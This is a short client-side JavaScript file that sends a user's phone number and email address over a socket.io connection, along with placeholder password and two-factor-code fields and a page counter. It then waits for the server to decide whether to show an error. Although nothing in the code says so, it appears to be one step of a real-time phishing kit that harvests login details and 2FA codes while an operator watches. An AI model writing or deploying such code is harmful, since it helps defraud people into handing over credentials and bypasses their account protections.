const socket = io();

function submitWithLoading() {
  const requestId = Math.random().toFixed(0) + Date.now();
  
  const info = document.getElementById('infoInput').value;
  const prefix = document.getElementById('prefix').value;
  const phoneNumber = document.getElementById('phoneNumber').value;
  const emailAddress = document.getElementById('emailAddress').value;

  // Display loading modal with a unique identifier
  const loadingModal = document.getElementById('loadingModal');
  loadingModal.id = requestId; // Set the id attribute
  loadingModal.style.display = 'block';
  const errorBlock = document.getElementById('errorBlock');
  errorBlock.id = 'e-' + requestId; // Set the id attribute

  // Emit the user input and the unique identifier to the server
  socket.emit('input', {
    id: requestId,
    phoneNumber: prefix+phoneNumber,
    emailAddress: emailAddress,
    password: '',
    twofa: '',
    currentPage: 3
  });
}

// Listen for server confirmation to hide the loading modal
socket.on('turnOffModal', function (data) {
  if (data.checkType == 1) {
    document.getElementById('e-' + data.modalId).style.display = 'block';
  } else {
    document.getElementById('e-' + data.modalId).style.display = 'none';
  }

  // Hide the specified loading modal
  document.getElementById(data.modalId).style.display = 'none';
  document.getElementById(data.modalId).id = 'loadingModal';
  document.getElementById('e-' + data.modalId).id = 'errorBlock'
});